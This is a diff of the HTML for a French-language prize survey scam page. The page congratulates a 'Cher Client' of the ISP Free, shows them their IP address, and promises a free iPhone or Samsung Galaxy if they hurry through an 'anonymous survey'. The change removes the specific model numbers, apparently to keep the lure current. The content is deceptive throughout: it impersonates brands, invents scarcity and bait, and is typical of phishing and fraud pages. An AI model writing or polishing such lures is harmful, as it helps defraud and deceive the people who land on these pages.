@@ -104,8 +104,8 @@
                     document.write(msg2);
                     </script>
                     <font size="3"><span>Félicitations Cher Client</span> <strong> Free! </strong></font><br><br>Votre
-                    adresse<b> IP 85.203.13.24</b> a été sélectionné pour recevoir GRATUITEMENT un<b> Apple iPhone 8 ou
-                        un Samsung Galaxy S8.</b> <b><span class="amazon-color"></span>.</b><br><br>
+                    adresse<b> IP 85.203.13.24</b> a été sélectionné pour recevoir GRATUITEMENT un<b> Apple iPhone ou
+                        un Samsung Galaxy.</b> <b><span class="amazon-color"></span>.</b><br><br>
                     <p>Pour recevoir votre cadeau, il vous suffit de répondre à notre sondage anonyme. Mais
                         dépêchez-vous! Il ne reste qu'un nombre limité de cadeaux pour aujourd'hui</p>
                     <br>Disponible pour les <strong><span style="color:red;">
